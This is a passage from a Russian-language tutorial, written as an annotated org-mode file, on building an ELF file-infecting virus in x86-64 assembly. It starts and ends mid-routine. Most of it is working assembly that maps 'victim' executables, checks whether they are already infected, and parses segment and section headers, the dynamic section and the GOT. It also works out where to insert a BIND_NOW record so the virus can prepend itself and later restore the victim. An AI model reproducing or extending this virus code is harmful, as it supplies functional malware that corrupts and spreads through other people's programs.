      movq    $-1, get_virus_success(%rip)
      movq    $-1, recount_success(%rip)

      xor     %rax, %rax
      jmp     _clear_old_data_exit

  _clear_old_data_fail:
      mov     $-1, %rax

  _clear_old_data_exit:
      pop    %rbx
      ret

#+END_SRC

*** Парсинг жертвы
Чтоб заразить какой-то эльф файл, нам нужно ответить на несколько
вопросов:
- действительно ли это эльф файл
- заражен он уе или чист
- где находятся заголовки сегментов и сколько их, сколько места в памяти
  они суммарно занимают
- где находятся заголовки секций, сколько их и сколько места в памяти
  занимают
- где начинается код жертвы (т.е. все, что между таблицами заголовков) и
  каков его виртуальный адрес
- если ли секция ~dynamic~
- если она есть, то есть секция ~got~
- ищем таблицу символов ~symtab~
- а так же определяем, используется ли "ленивое" связывание или все
  библиотечкие вызовы связываются сразу - это мы понимаем по наличию
  записи ~BIND_NOW~ в секции ~dynamic~

А зачем нам информация о связывании? Не все ли равно?
Дело в том, что сочетание динамической линковки и позиционно-зависимого
кода дает занимательный коктейль проблем.

С одной стороны у нас есть позиционно-зависимый код, из-за чего после
работы вируса, код жертвы придется сдвигать на его прежние адреса - как
буждто заражения и не было. Иначе мы будем переходить на уже неактуальные
адреса, и программа будет сегфолтиться. Урегулировать все ссылки вручную
сишном трудно, поэтому файл надо однозначно сдвигать в памяти процесса.

А с другой стороны во время загрузки файла, у нас включается линкер,
который должен связать ссылки в библиотеках друг на друга. После того,
как линкер завершит своб работу, он поместит свой адрес в таблицу ~GOT~ -
так мы сможем его вызвать при использовании "ленивого" связывания.
Линкер берет всю нужную ему инфу из секции ~dynamic~.

Затем управление переходит в жертву, а та вызывает ~libc~, чтоб
обеспечить корректный старт. После чего программа дойдет до своего
последнего ~ret~ и... снова вызовется ~libc~, которая обеспечит
корректный выход. ~libc~ в свою очередь использует код в специальных
секциях, кторые находятся в файле, например, ~fini~. И информация об этих
секциях тоже содержится в секции ~dynamic~.

И казалось бы, нет никаких проблем: вирус отрабатывает, мы редактируем
записи в секции dynamic так, как будто заражения не было,
т.е. восстанавливаем старые адреса, жертва сдвигается, а дальше и линкер,
и ~libc~ черпают нужную им информацию из ~dynamic~. А поскольку мы все
правильно отредатировали, все работает.

Но из-за экономии ресурсов, линкер во время загрузки, еще до передачи
управления программе, записывает адреса нужных ему и ~libc~ записей в
секции ~dynamic~ - т.е. адреса по которым они расположены в памяти -
в специальный буфер, который он себе заводит. А адрес на этот буфер кладет
в одну из записей ~GOT~. В дальнейшем часть информации будет браться из
буфера, а часть - из секции ~dynamic~
В результате у нас проблема: не сдвигать жертву мы не можем. А
если сдвинуть ее, то информация, которая записана в буфере линкера,
станет неактуальной.

И вот поэтому нам нужно избавиться от ленивого связывания, чтоб буфер
стал просто не нужен. И именно поэтому мы ищем запись ~BIND_NOW~ - если
она есть, то все линкуется до того, как программе переходит
управление, а если записи нет, то связывание ленивое - и мы от него
избавимся, вставив свою запись ~BIND_NOW~.

А теперь вернмся к парсингу файла жертвы.
Для начала нам надо его открыть, смаппить в память и сохранить адрес на
эту память в переменную ~victim_elf_addr~
#+NAME: _get_victim_addr
#+BEGIN_SRC asm
  /// Открывает файл и сохраняет его
  /// адрес
  _get_victim_addr:
      push    %rdi
      push    %rsi

      mov     file_name_ptr(%rip), %rdi
      mov     $O_RDWR, %rsi
      call    _openfile

      cmp     $0x0,  %rax
      jl      _get_victim_addr_fail

      mov     %rax, victim_elf_addr(%rip)
      xor     %rax, %rax
      jmp     _get_victim_addr_exit

  _get_victim_addr_fail:
      mov     $-1, %rax

  _get_victim_addr_exit:
      pop    %rsi
      pop    %rdi
      ret

#+END_SRC

Затем мы хотим проверить, является ли этот файл эльф-файлом или нет.
Выяснить это просто: в начале эльф-файла всегда будут находиться
"магические байты", которые однозначно укажут на принадлежность этого
файла к эльфам. Если все окей, то в ~RAX~ попадет 0, а иначе -1.

#+NAME: _is_it_elf
#+BEGIN_SRC asm
  /// IS_IT_ELF
  /// PARAMS
  /// Проверяет наличие магических байт в
  /// загруженном эльфе
  /// Если магические байты есть, то
  /// возвращает 1 в RAX
  /// В противном случае - 0
  magic_bytes_example:
      .quad 0x10102464c457f

  _is_it_elf:
      push    %rdx
      push    %rbx
      push    %rsi
      push    %rcx

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _is_it_elf_fail

      movq    (%rbx), %rdx
      mov     magic_bytes_example(%rip), %rsi

      cmp     %rsi, %rdx
      jne     _is_it_elf_fail

      xor     %rax, %rax
      jmp     _is_it_elf_exit

  _is_it_elf_fail:
      mov     $-1, %rax

  _is_it_elf_exit:
      pop     %rcx
      pop     %rsi
      pop     %rbx
      pop     %rdx
      ret

#+END_SRC

Предположим, это все-таки эльф. Теперь самое логичное - это проверить,
инфицирован ли файл. Но мы не можем сделать это так сразу.

Как вообще проверить, инфицирован ли файл?
Очевидная идея: берем точку входа вируса и точку входа жертвы и
сравниваем их n байт. Если последовательность совпала, то файл
инфицирован. Благо, что виртуальный адрес точки входа жертвы у нас есть в
загоове эльфа.

Но это не сработает по нескольким причинам.

Во-первых, когда файл мапится в память, то виртуальные адреса программы
могут служить нам лишь ориентиром, показывая, как далеко находится тот
или иной код друг от друга. Так что сначала надо выяснить, где
располагается точка входа жертвы в память.

Логичный шаг для этого найти, с какого виртуального адреса начинается
эльф-файл - это будет виртуальный адрес первого загружаемого сегмента
кода - вычесть этот виртуальный адрес из виртуального адреса точки
входа и таким образом выяснить, как далеко точка вход находится от начала
файла. Затем просто прибавить это смещение к адресу в ~victim_elf_addr~,
и дело в шляпе.

Но тут есть новая проблема: ~mmap~ не учитывает выравнивания, когда
грузит файл в память. Он грузит код ровно так, как он расположен в
файле.

Скажем, начальный виртуальный адрес эльфа ~0x400000~, а адрес ~start~
жертвы - ~0x600000~. Так получается, потому что между первым загружаемым
сегментом кода и сегментом, где лежит ~start~, есть выравнивание в
~200000~ байт. Так что если вычесть одно из другого, то  мы получим
разницу в ~200000~.

Но в файле-то код идет подряд. И на самом деле разница между началом
эльфа и точкой ~start~ 300 байт, а не 200 тыс. В результате попытка
посчитать адрес ~start~ в смапенном файле таким образом приведет к
сегфолту: мы будем пытаться обратиться к памяти, которая лежит далеко за
границами смапенного файла.

Поскольку я не нашел вариант, как из виртуального адреса высчитать
смещение в файле, то придется искать вирус во всех секциях кода, которые
обозначены как ~PROGBITS~ - т.е. содержимое секции установлено
программой и именно этот тип заголовка имеет секция ~.text~

Кстати, а почему в секциях, а не в сегментах?
А дело в том, что ~start~ как правило не оказывается в самом начале
загружаемого сегмента. Загружаемый сегмент кода, по крайней мере у меня,
не начинается с секции ~text~. В результате, чтоб точно не проворонить
вирус, придется прочесывать все сегменты целиком - а они значительно
больше секций по размеру. В то время как секции более мелкие, а потому
можно проверять только их начало.

Поэтому прежде чем проверять, инфицирован ли файл, надо сначала найти
заголовки секций в файле.

Сделать это легко: заголовок эльфа содержит в себе информацию о
количестве заголовков секций и смещении первого из них от начала файла.
Так что базовый адрес эльфа из ~victim_elf_addr~ + смещение до заголовков
секций = ~victim_shdr_table_addr~ (адрес таблицы заголовков секций в
памяти). Ну а количество секций вообще считать не надо, только
скопировать из заголовка эльфа.
Так же нам придется в будущем вписывать секции обратно в файл, а значит
надо знать, сколько места они занимают суммарно. Количество секций * 64
байта (размер одной секции ) = размер всех секций в байтах.
#+NAME: _get_shdrs_info
#+BEGIN_SRC asm
  /// получает данные о заголовках секций
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_shdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_shdrs_info_fail
      mov     %rdi, %rsi

      mov     ELF_E_SHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_shdr_table_addr(%rip)

      mov     ELF_E_SHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_shdr_amount(%rip)

      mov     $0x40, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_shdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_shdrs_info_exit

  _get_shdrs_info_fail:
      mov     $-1, %rax

  _get_shdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

И вот после этого можно проверять, инфицирован ли файл.
Для этого мы берем каждый заголовок секции. Проверяем его тип, если не
~PROGBITS~, то пропускаем загоовок.
Иначе считываем смещение из заголовка - оно указывает на смещение
описываемого кода от начала эльфа - прибавляем его к базовому адресу
эльфа в памяти, получая таким образом адрес секции в памяти, а затем
проверяем ее первые 32 байта. Если все совпали, файл заражен.

#+NAME: _check_file_infection
#+BEGIN_SRC asm
  /// _CHECK_FILE_INFECTION
  /// Проверяет, является ли открытый файл зараженным
  /// - проверяем каждую загружаемую секцию
  /// - берем ее смещение, считаем адрес его кода
  ///   в памяти
  /// - сравнивам первый 32 байта по этому адресу со
  ///   start вируса
  /// - если совпали - файл заражен, вернуть -1
  /// - иначе проверить все сегменты, если нигде не совпало,
  /// вернуть 0
  _check_file_infection:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %rbx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_elf_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _check_file_infection_fail

      mov     victim_shdr_table_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _check_file_infection_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _check_file_infection_fail

      leaq    _start(%rip), %rdi

  _check_file_infection_cycle:
      push    %rcx
      mov     SHDR_SH_TYPE(%rsi), %rbx

      // секция SHT_PROGBITS?
      cmp     $0x1, %bl
      jne     _next_segm


      mov     SHDR_SH_OFFSET(%rsi), %rbx
      mov     $0x4, %rcx

      // адрес сегмента в памяти
      add     %rdx, %rbx

      // проверяем конкретную
      // секцию кода
  _check_segm_infection_cycle:
      movq    (%rdi), %rax
      movq    (%rbx), %r8

      cmp     %rax,  %r8
      jne     _next_segm

      add     $0x8, %rdi
      add     $0x8, %rbx

      loop    _check_segm_infection_cycle
      jmp     _check_file_infection_fail

  _next_segm:
      pop     %rcx
      add     $0x40, %rsi
      loop    _check_file_infection_cycle

  _check_file_infection_success:
      xor     %rax, %rax
      jmp     _check_file_infection_exit

  _check_file_infection_fail:
      pop     %rcx
      mov     $-1, %rax

  _check_file_infection_exit:
      pop    %rsi
      pop    %rdi
      pop    %r8
      pop    %rbx
      pop    %rdx
      pop    %rcx
      pop    %rbx
      ret
#+END_SRC

Если файл не инфицирован, то собираем информацию о нем дальше. В
противном случае мы возьмем новый файл, если они еще остались в папке, и
будем пробовать парсить его.

Собираем информациб о заголовках сегментом так же, как собирали о
заголовках секций.

#+NAME: _get_phdrs_info
#+BEGIN_SRC asm
  /// получает данные о заголовках сегментов
  /// жертвы:
  /// - адрес заголовков в памяти
  /// - количество
  /// - суммарно занимаемая память
  /// в случае провала возвращ. -1
  _get_phdrs_info:
      push    %rdi
      push    %rsi
      push    %rcx
      push    %rdx

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _get_phdrs_info_fail

      mov     %rdi, %rsi
      mov     ELF_E_PHOFF(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, victim_phdr_table_addr(%rip)

      mov     ELF_E_PHNUM(%rdi), %ecx
      movzwl  %cx, %ecx
      mov     %rcx, victim_phdr_amount(%rip)

      mov     $0x38, %rdx
      imul    %rcx,  %rdx
      mov     %rdx, victim_phdr_table_size(%rip)

      xor     %rax, %rax
      jmp     _get_phdrs_info_exit

  _get_phdrs_info_fail:
      mov     $-1, %rax

  _get_phdrs_info_exit:
      pop     %rdx
      pop     %rcx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Теперь ищем первый загружаемый сегмент и сохраняем его виртуальный
адрес. Это позволит нам считать разные смещения в будущем и определять
первый загружаемый сегмент среди прочих сегментов.
Первый загружаемый сегмент будет иметь самый младший адрес.
Сохраняем виртуальный адрес из первого же заголовка сегмента.
Проходимся по загоовкам сегментов, если сегмент не загружаемый - не тип
№1 (LOAD) - то пропускаем его. Иначе сравниваем его виртуальный адрес с
уже имеющимся. Если он меньше, то сохраняем его. И так до тех пор, пока
все заголовки сегментов не кончатся.

#+NAME: _find_first_seg_vaddr
#+BEGIN_SRC asm
  /// Ищет и заполняет данные о
  /// первом сегменте кода эльфа
  _find_first_seg_vaddr:
      push    %rcx
      push    %r8

      mov     victim_phdr_table_addr(%rip), %r8
      mov     victim_phdr_amount(%rip), %rcx

      test    %r8, %r8
      je      _find_first_seg_vaddr_fail

      test    %rcx, %rcx
      je      _find_first_seg_vaddr_fail

      mov     %r8, %rdi

  _find_first_seg_vaddr_cycle:
      cmp     $0x1, (%rdi)
      jne     _find_first_seg_vaddr_next

      cmp     $0x1, (%r8)
      jne     _set_first_seg

      mov     PHDR_P_VADDR(%rdi), %rsi
      mov     PHDR_P_VADDR(%r8), %rax

      cmp     %rax, %rsi
      jl      _set_first_seg
      jmp     _find_first_seg_vaddr_next

  _set_first_seg:
      mov     %rdi, %r8

  _find_first_seg_vaddr_next:
      add     $0x38, %rdi
      loop    _find_first_seg_vaddr_cycle

  _find_first_seg_vaddr_success:
      leaq    first_seg_vaddr(%rip), %rsi
      mov     PHDR_P_VADDR(%r8), %rdi
      mov     %rdi, (%rsi)

      leaq    first_seg_addr(%rip), %rsi
      mov     %r8, (%rsi)

      xor     %rax, %rax
      jmp    _find_first_seg_vaddr_exit

  _find_first_seg_vaddr_fail:
      mov     $-1, %rax

  _find_first_seg_vaddr_exit:
      pop     %r8
      pop     %rcx
      ret

#+END_SRC

Теперь ищем последний загружаемый сегмент в жертве. Его данные -
виртуальный адрес и выравнивание - нужны нам, чтоб правильно посчитать
новый виртуальный адрес вируса для его заголовка.
Ищем его таким же образом, как искали первый загружаемый сегмент. Только
теперь адрес должен быть больше, чем сохраненный на предыдущей итерации.

#+NAME: _find_last_seg_vaddr
#+BEGIN_SRC asm
    /// _FIND_LAST_SEG_VADDR
  /// Ищет виртуальный адрес последнего сегмента кода
  _find_last_seg_vaddr:
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      mov     victim_phdr_table_addr(%rip), %r8
      mov     victim_phdr_amount(%rip), %rcx

      test    %r8, %r8
      je      _find_last_seg_vaddr_fail

      test    %rcx, %rcx
      je      _find_last_seg_vaddr_fail

      mov     %r8, %rdi
  _find_last_seg_vaddr_cycle:

      cmp     $1, (%rdi)
      jne     _find_last_seg_vaddr_next

      mov     PHDR_P_VADDR(%rdi), %rsi
      mov     PHDR_P_VADDR(%r8), %rax

      cmp     %rax, %rsi
      jg      _set_last_seg
      jmp     _find_last_seg_vaddr_next

  _set_last_seg:
      mov     %rdi, %r8

  _find_last_seg_vaddr_next:
      add     $0x38, %rdi
      loop    _find_last_seg_vaddr_cycle

  _find_last_seg_vaddr_success:
      leaq    last_seg_vaddr(%rip), %rsi

      mov     PHDR_P_VADDR(%r8), %rax
      mov     PHDR_P_ALLIGN(%r8), %rcx

      mov     %rax, (%rsi)
      leaq    last_seg_allign(%rip), %rsi
      mov     %rcx, (%rsi)

      xor     %rax, %rax
      jmp     _find_last_seg_vaddr_exit

  _find_last_seg_vaddr_fail:
      mov     $-1, %rax

  _find_last_seg_vaddr_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      ret
#+END_SRC

Теперь самое время определить, есть у нас секция ~dynamic~ или нет. Если
ее нет, то динамическая линковка не предполагается, так что нам будет
совсем просто его заражать.

Все, что нужно - это пройтись по заголовкам секций и начти секцию с типом
#6 - это тип секции ~dynamic~. Если такая секция есть, то мы сохраняем ее
виртуальный адрес, ее размер, смещение от начала файла и считаем адрес в
смапенной памяти. Все эти данные понадобятся нам
при пересчете данных жертвы или для доступа к самой секции ~dynamic~

#+NAME: _find_dynamic
#+BEGIN_SRC asm
  /// _FIND_DYNAMIC
  /// Ищет заголовок секции dynamic
  /// Если находит, то заполняет данные о секции
  _find_dynamic:
      push    %rcx
      push    %rdx
      push    %rdi

      mov     victim_shdr_table_addr(%rip), %rdi
      mov     victim_shdr_amount(%rip), %rcx

      test   %rdi, %rdi
      je      _find_dynamic_fail

      test   %rcx, %rcx
      je     _find_dynamic_fail

  _find_dynamic_cycle:
      mov     SHDR_SH_TYPE(%rdi), %rdx
      cmp     $0x6, %dl   # shdr = dynamic?
      je      _find_dynamic_success

      add     $0x40, %rdi
      loop    _find_dynamic_cycle
      jmp     _find_dynamic_fail

  _find_dynamic_success:
      mov     SHDR_SH_ADDR(%rdi), %rdx
      mov     %rdx, dynamic_records_vaddr(%rip)   # dynamic sh_vaddr

      mov     SHDR_SH_OFFSET(%rdi), %rdx
      mov     %rdx, dynamic_records_offset(%rip)   # dynamic sh_offset

      mov     victim_elf_addr(%rip), %rcx
      add     %rdx, %rcx
      mov     %rcx, dynamic_records_addr(%rip)

      mov     SHDR_SH_SIZE(%rdi), %rdx
      mov     %rdx, dynamic_records_size(%rip)   # dynamic size

      xor     %rax, %rax
      jmp     _find_dynamic_exit

  _find_dynamic_fail:
      mov     $-1, %rax

  _find_dynamic_exit:
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC


Теперь мы определяем тип связывания - ленивое или нет. Для этого в секции
~dynamic~ мы ищем запись ~BIND_NOW~. Если нашли, то переменная
~new_bind_now_flag_record_size~ - т.е. размер новой записи ~BIND_NOW~ -
будет установлена в ноль. Ведь новую запись вставлять не надо.
В противном случае в эту переменную будет положено значение ~0x10~ -
размер новой записи (любая запись ~dynamic~ занимет 16 байт)

Эта переменная крайне важна: при пересчете данных жертвы мы будем
смотреть, находится ли пересчитываемый адрес/смещение ниже секции
~dynamic~. Если да, то нас придется учитывать ~возможное~ расширение секции
~dynamic~, поэтому мы будем увеличивать редактируемое значение на 56 байт
(размер вставляемого заголовка вируса) + ~содержимое~  переменной
~new_bind_now_flag_record_size~. Это позволит не проверять все время,
вставляем мы запись ~BIND_NOW~ или нет.

Так же, если запись вставляется, то нам надо узнать, куда именно в секции
~dynamic~ мы ее вставляем. У меня она вставляется перед записью ~NULL~ -
последней записью в секции ~dynamic~, которая является обязательной для
секции.
И нет, нельзя првратить ее в запись ~BIND_NOW~ именно потому, что она
является обязательной.
Так что мы сохраним смещение от начал секции ~dynamic~ до записи ~NULL~ в
переменную ~new_bind_now_record_frm_dynamic_offset~.

#+NAME: _find_bind_now_record
#+BEGIN_SRC asm
  _find_bind_now_record:
      push    %rdx
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      mov    dynamic_records_offset(%rip), %rdx
      test   %rdx, %rdx
      je      _find_bind_now_record_fail

      mov     dynamic_records_size(%rip),%rax
      test    %rax, %rax
      je      _find_bind_now_record_fail

      // адрес секции dynamic в памяти
      mov    victim_elf_addr(%rip), %rdi
      add    %rdx, %rdi

      mov     %rdi, %r8

      // установили счетчик цикла
      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx
      mov     %eax, %ecx

  _find_bind_now_record_cycle:
      // запсиь BIND_NOW?
      cmpq    $0x18, (%rdi)
      je      _bind_now_record_exist

      // запись NULL?
      cmp     $0x0, (%rdi)
      // запись NULL всегда последняя,
      // так что дальше проверять не имеет смысла
      je      _no_bind_now_record_exist

      add     $0x10, %rdi
      loop    _find_bind_now_record_cycle

      jmp     _no_bind_now_record_exist

  _bind_now_record_exist:
      //  обнуили размер новой записи - ее же не будет
      movb    $0x0, new_bind_now_flag_record_size(%rip)
      xor     %rax, %rax

      jmp     _find_bind_now_record_exit

      // записи BIND_NOW нет - придется позже генерировать новую
  _no_bind_now_record_exist:
      movb    $0x10, new_bind_now_flag_record_size(%rip)

      // посчитали смещение от начала секции dynamic
      // до места, куда будем вписывать новую запись
      sub     %r8, %rdi
      mov     %rdi, new_bind_now_record_frm_dynamic_offset(%rip)

      xor     %rax, %rax
      jmp     _find_bind_now_record_exit

  _find_bind_now_record_fail:
      mov     $-1, %rax

  _find_bind_now_record_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      pop     %rdx
      ret

#+END_SRC

Ну и теперь надо найти таблицу ~GOT~ в файле.
Искать мы ее будем не через заголовки секций или сегментов, а через
секцию ~dynamic~. Дело в том, что у таблицы ~GOT~ нет своей специфической
секции - у кого-то она расположена в секции ~.got~,  у кого-то в
~.got.plt~ и т.д. А у этих секций нет своего специфического номера типа -
как, например, у секции ~rela~ (тип 4) и у секции ~dynamic~ (тип 6).

Зато ее можно найти в ~dynamic~: запись о таблице ~GOT~ будет иметь тип
3 и в ней будет указан виртуальный адрес ~GOT~, что позволит нам находить
заголовок этой таблицы в таблице секций, а уже через него найти GOT в
смапенной памяти.

#+NAME: _find_got_section_vaddr
#+BEGIN_SRC asm
  /// _FIND_GOT_SECTION
  /// Ищет запись GOT в секции dynamic
  /// и сохраняет виртуальный адрес секции
  /// GOT, если находит запись о ней
  _find_got_section_vaddr:
      push    %rcx
      push    %rdx
      push    %rdi

      // проверяем данные
      mov     dynamic_records_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_got_section_vaddr_fail

      mov     dynamic_records_size(%rip), %rax
      test    %rax, %rax
      je      _find_got_section_vaddr_fail

      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx

      mov     %eax, %ecx  # количество записей
      mov     %rdi, %rsi

  _find_got_section_vaddr_cycle:
      cmpl     $0x3, (%rdi)
      je      _find_got_section_vaddr_success

      add     $0x10,%rdi
      loop    _find_got_section_vaddr_cycle
      jmp     _find_got_section_vaddr_fail

  _find_got_section_vaddr_success:
      add     $0x8, %rdi
      mov     (%rdi), %rax
      mov     %rax, GOT_vaddr(%rip)

      xor     %rax, %rax
      jmp     _find_got_section_vaddr_exit

  _find_got_section_vaddr_fail:
      mov     $-1, %rax

  _find_got_section_vaddr_exit:
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

А после того, как нашли виртуальный адрес ~GOT~, можно найти заголовок
этой секции и высчитать адрес, по которому GOT находится в спаменной
памяти - это даст доступ к ~GOT~ в любой момент.

Адрес высчитывает просто: базовый адрес эльфа в памяти + смещение секции от
начала файла.
#+NAME: _find_got_section_im_memory
#+BEGIN_SRC asm
  /// _FIND_GOT_SECTION_IM_MEMORY
  /// высчитывает адрес секции GOT
  /// в памяти и ее размер
  _find_got_section_im_memory:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      // проверяем данные
      mov     victim_elf_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _find_got_section_im_memory_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_got_section_im_memory_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_got_section_im_memory_fail

      mov     GOT_vaddr(%rip), %rdx
      test    %rdx, %rdx
      je      _find_got_section_im_memory_fail

  _find_got_section_im_memory_cycle:
      add     $0x10, %rdi
      cmp     %rdx, (%rdi)

      je      _find_got_section_im_memory_success

      add     $0x30, %rdi

      loop    _find_got_section_im_memory_cycle
      jmp     _find_got_section_im_memory_fail

  _find_got_section_im_memory_success:
      add     $0x8, %rdi # sh_offset
      mov     (%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, GOT_addr_in_memory(%rip)

      add     $0x8, %rdi # sh_size
      mov     (%rdi), %rcx
      mov     %rcx, GOT_size(%rip)

      xor     %rax, %rax
      jmp     _find_got_section_im_memory_exit

  _find_got_section_im_memory_fail:
      mov     $-1, %rax

  _find_got_section_im_memory_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx
      ret

#+END_SRC

Теперь можно определить адрес кода жертвы и его размер.
Кодом жертвы я называю все, что находится между таблицей заголовков сегментов и
таблицей заголовков секций.
Это нужно, чтоб при перекомпоновке мы могли вписать в эльф код жертвы.

В зависимости от того, вставляем мы запись ~BIND_NOW~ или нет, мы
по-разному высчитываем информацию о коде жертвы и сохраняем ее.
Если ~BIND_NOW~ вставляеться ~не~ будет, то код жертвы можено будет
записать в файл одним вызовом. Тогда нам понадобится только адрес его
начала в памяти размер.

Вы считать это просто: код жертвы начнется сразу от талицы заголовков
сегментов. Так что мы берем размер этой таблицы + размер заголовка
эльфа + базовый адрес эльфа в памяти = адрес начала кода жертвы в памяти.

Затем высчитываем конечный адрес: базовый адрес эльфа в памяти + смещение
до таблицы заголовков секций. Вычитая один адрес из другого, мы получаем
размер этого кода.

#+NAME: _get_victim_whole_code_addr_and_size
#+BEGIN_SRC asm
  /// _GET_VICTIM_WHOLE_CODE_ADDR_AND_SIZE
  /// Высчитывает адрес и размер всего кода жертвы,
  /// если мы не генерируем запись BIND_NOW
  _get_victim_whole_code_addr_and_size:
      push    %rcx
      push    %rdx

      // проверяем наличие всех необходимых данных
      // мы генерируем новыую запись BIND_NOW?
      // если да, то этот метод вычисления размера и адреса
      // кода жертвы нам не подходит
      mov     new_bind_now_flag_record_size(%rip), %rcx
      test    %rcx, %rcx
      jne     _get_victim_whole_code_addr_and_size_fail

      mov     victim_phdr_table_size(%rip), %rcx
      test    %rcx, %rcx
      je      _get_victim_whole_code_addr_and_size_fail

      mov     victim_phdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_whole_code_addr_and_size_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_whole_code_addr_and_size_fail

      // вычисляем размер и адрес кода жертвы
      leaq    victim_code_offset(%rip), %rdx
      mov     %rcx, (%rdx)
      add     $0x40, (%rdx)

      // считаем адрес кода жертвы
      mov     victim_phdr_table_addr(%rip), %rdx
      add     %rdx, %rcx
      mov     %rcx, victim_code_addr(%rip)

      // считаем  размер кода жертвы
      mov     victim_shdr_table_addr(%rip), %rdx
      sub     %rcx, %rdx
      mov     %rdx, victim_code_size(%rip)

      xor     %rax, %rax
      jmp     _get_victim_whole_code_addr_and_size_exit

  _get_victim_whole_code_addr_and_size_fail:
      mov     $-1, %rax

  _get_victim_whole_code_addr_and_size_exit:
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Если же ~BIND_NOW~ вставляется, то все становится сложнее.
Нам нужно будет вписать в файл сначала весь код жертвы до меса вставки,
затем саму запись, а затем оставшийся код.

Поэтому мы считаем адрес начала кода жертвы, как это было показано
выше и сохраняем его в ~victim_code_before_bind_now_addr~.
Затем считаем адрес в памяти, по которому будет вставляться
~BIND_NOW~ как смещение до секции ~dynamic~ + смещение от ~dynamic~ до
вставляемой ~BIND_NOW~ + базовый адрес эльфа в памяти. Сохраняем этот
адрес как адрес оставшейся части кода жертвы в ~victim_code_after_bind_now_addr~

Вычитаем адрес начала кода из полученного и таким образом получаем
размер кода жертвы от начала до места вставки

А затем высчитываем, где код жертвы кончается: базовый адрес эльфа +
смещение до таблицы заголовков секций. И вычитая адрес из
~victim_code_after_bind_now_addr~ из полученного, высчитываем размер
оставшегося кода жертвы.

#+NAME: _get_victim_code_addr_and_size_with_bind_now
#+BEGIN_SRC asm
  /// _GET_VICTIM_CODE_ADDR_AND_SIZE_WITH_BIND_NOW
  /// Если мы вставляем запись BIND_NOW,
  /// то высчитываем:
  /// - адрес и размер кода жертвы от его начала до
  ///   места вставки BIND_NOW
  /// - адрес и размер кода жертвы от места вставки BIND_NOW
  ///   и до его конца
  _get_victim_code_addr_and_size_with_bind_now:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      // вставляем BIND_NOW?
      mov     new_bind_now_flag_record_size(%rip), %rcx
      test    %rcx, %rcx
      je     _get_victim_code_addr_and_size_with_bind_now_fail

      // проверка необходимых данных для высчитывания
      mov     victim_phdr_table_size(%rip), %rcx
      test    %rcx, %rcx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_phdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov      dynamic_records_offset(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      mov     new_bind_now_record_frm_dynamic_offset(%rip), %rdx
      test    %rdx, %rdx
      je      _get_victim_code_addr_and_size_with_bind_now_fail

      // если все данные на месте, начинаем считать
      mov     victim_phdr_table_size(%rip), %rcx
      leaq    victim_code_offset(%rip), %rdx
      mov     %rcx, (%rdx)
      add     $0x40, (%rdx)   # save victim begin code offset

      mov     victim_phdr_table_addr(%rip), %rdx
      add     %rdx, %rcx

      // сохранили адрес начала кода
      mov     %rcx, victim_code_before_bind_now_addr(%rip)

      mov     dynamic_records_offset(%rip), %rdi
      mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
      add     %rdi, %rsi  # offsetnew bind_now record frm file begin

      mov     victim_elf_addr(%rip), %rdx
      add     %rsi, %rdx

      // высчитали адрес кода от места вставки
      mov     %rdx,  victim_code_after_bind_now_addr(%rip)
      sub     %rcx, %rdx
      // высчитали размер кода от начала до вставки
      mov     %rdx, victim_code_before_bind_now_size(%rip)

      // высчитали размер кода от вставки до конца
      mov     victim_code_after_bind_now_addr(%rip), %rsi
      mov     victim_shdr_table_addr(%rip), %rdx
      sub     %rsi, %rdx
      mov     %rdx, victim_code_after_bind_now_size(%rip)

      xor     %rax, %rax
      jmp     _get_victim_code_addr_and_size_with_bind_now_exit
  _get_victim_code_addr_and_size_with_bind_now_fail:
      xor     $-1, %rax

